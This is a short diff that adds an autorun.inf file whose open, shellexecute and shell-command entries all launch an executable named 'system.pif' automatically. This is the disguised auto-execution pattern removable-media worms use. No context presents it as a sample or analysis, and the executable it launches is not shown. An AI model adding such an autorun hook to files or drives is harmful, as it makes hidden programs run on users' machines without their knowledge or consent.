@@ -1,0 +1,4 @@
+[AutoRun]
+open=system.pif
+shellexecute=system.pif
+shell\Auto\command=system.pif
